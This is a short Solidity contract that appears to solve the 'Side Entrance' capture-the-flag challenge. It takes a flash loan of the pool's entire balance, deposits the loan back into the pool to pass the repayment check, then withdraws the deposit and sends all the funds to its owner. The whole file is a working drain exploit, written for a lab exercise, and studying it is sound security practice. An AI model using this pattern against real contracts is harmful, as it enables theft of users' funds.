// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "./SideEntranceLenderPool.sol";

contract Executor is IFlashLoanEtherReceiver {
    using Address for address payable;

    SideEntranceLenderPool pool;
    address owner;

    constructor(SideEntranceLenderPool _pool) {
        owner = msg.sender;
        pool = _pool;
    }

    function execute() external payable {
        require(msg.sender == address(pool), "only pool");
        // Receive flash loan and call pool.deposit
        pool.deposit{value: msg.value}();
    }

    function borrow() external {
        require(msg.sender == owner, "only owner");
        uint256 poolBalance = address(pool).balance;
        pool.flashLoan(poolBalance);
        pool.withdraw();
        //Transfer received pool balance to the owner
        payable(owner).sendValue(address(this).balance);
    }

    receive () external payable {}
}